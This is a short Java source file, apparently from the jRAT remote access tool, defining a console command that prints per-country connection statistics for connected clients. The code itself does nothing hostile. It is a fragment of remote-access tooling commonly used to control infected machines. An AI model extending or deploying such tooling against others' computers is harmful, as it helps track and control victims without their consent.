package pro.jrat.commands;

import java.util.List;

import pro.jrat.settings.Statistics;
import pro.jrat.settings.Statistics.StatEntry;

public class Commandliststats extends AbstractCommand {

	@Override
	public void process(String[] args) throws Exception {
		List<StatEntry> list = Statistics.getGlobal().getList();
		
		for (StatEntry entry : list) {
			System.out.println(entry.getLongCountry() + ", " + entry.getCountry() + ", " + entry.getConnects() + ", " + entry.getList().size());
		}
	}

}
